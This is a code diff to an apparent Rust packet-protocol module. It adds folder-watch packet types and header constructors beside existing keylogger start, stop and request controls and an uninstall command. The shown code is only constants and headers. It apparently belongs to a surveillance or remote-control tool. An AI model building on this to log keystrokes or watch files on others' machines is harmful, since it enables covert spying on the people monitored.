@@ -11,8 +11,9 @@ pub const PACKET_TYPE_FILE: u8 = 6;
 pub const PACKET_TYPE_KEYLOG: u8 = 7;
 pub const PACKET_TYPE_CTRL: u8 = 8;
 pub const PACKET_TYPE_FILE_WATCH: u8 = 9;
+pub const PACKET_TYPE_FOLDER_WATCH: u8 = 10;
 
-// Control subtypes
+// Control subtypes for PACKET_TYPE_CTRL
 pub const CTRL_START_KEYLOGGER: u8 = 1;
 pub const CTRL_STOP_KEYLOGGER: u8 = 2;
 pub const CTRL_REQUEST_KEYLOG: u8 = 3;
@@ -21,6 +22,11 @@ pub const CTRL_UNINSTALL: u8 = 4;
 // File watch subtypes
 pub const FILE_WATCH_UPDATE: u8 = 1;
 pub const FILE_WATCH_DELETE: u8 = 2;
+
+// Folder watch subtypes
+pub const FOLDER_WATCH_FILE_CREATE: u8 = 1;
+pub const FOLDER_WATCH_FILE_UPDATE: u8 = 2;
+pub const FOLDER_WATCH_FILE_DELETE: u8 = 3;
 
 pub const HEADER_SIZE: usize = 32;
 
@@ -46,10 +52,10 @@ impl PacketHeader {
         }
     }
 
-    pub fn new_file_watch(subtype: u8, content_len: u32) -> Self {
+    pub fn new_raw(ptype: u8, subtype: u8, content_len: u32) -> Self {
         Self {
             message_id: Uuid::new_v4().as_bytes().to_owned(),
-            packet_type: PACKET_TYPE_FILE_WATCH,
+            packet_type: ptype,
             subtype,
             content_length: content_len,
             sequence: 0,
@@ -63,6 +69,28 @@ impl PacketHeader {
             packet_type: PACKET_TYPE_CTRL,
             subtype,
             content_length: 0,
+            sequence: 0,
+            flags: 0,
+        }
+    }
+
+    pub fn new_file_watch(subtype: u8, content_len: u32) -> Self {
+        Self {
+            message_id: Uuid::new_v4().as_bytes().to_owned(),
+            packet_type: PACKET_TYPE_FILE_WATCH,
+            subtype,
+            content_length: content_len,
+            sequence: 0,
+            flags: 0,
+        }
+    }
+
+    pub fn new_folder_watch(subtype: u8, content_len: u32) -> Self {
+        Self {
+            message_id: Uuid::new_v4().as_bytes().to_owned(),
+            packet_type: PACKET_TYPE_FOLDER_WATCH,
+            subtype,
+            content_length: content_len,
             sequence: 0,
             flags: 0,
         }
